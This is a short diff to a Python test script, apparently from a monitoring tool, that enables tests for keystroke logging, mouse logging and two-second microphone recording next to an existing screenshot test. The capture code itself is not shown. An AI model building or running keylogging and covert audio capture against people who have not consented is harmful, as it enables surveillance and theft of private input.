@@ -6,10 +6,10 @@ import Mouselogger
 
 def main():
 
-    # test_keylog(1)
-    # test_mouselog(1)
+    test_keylog(1)
+    test_mouselog(1)
     test_getImage()
-    # test_getSound()
+    test_getSound()
 
 
 def test_keylog(waittime):
@@ -34,9 +34,8 @@ def test_getImage():
     print(screen.image)
 
 def test_getSound():
-    pass
-    #sound = getSound.getSound()
-    #sound.record(2)
+    sound = getSound.getSound()
+    sound.record(2)
 
 if __name__ == "__main__":
     main()
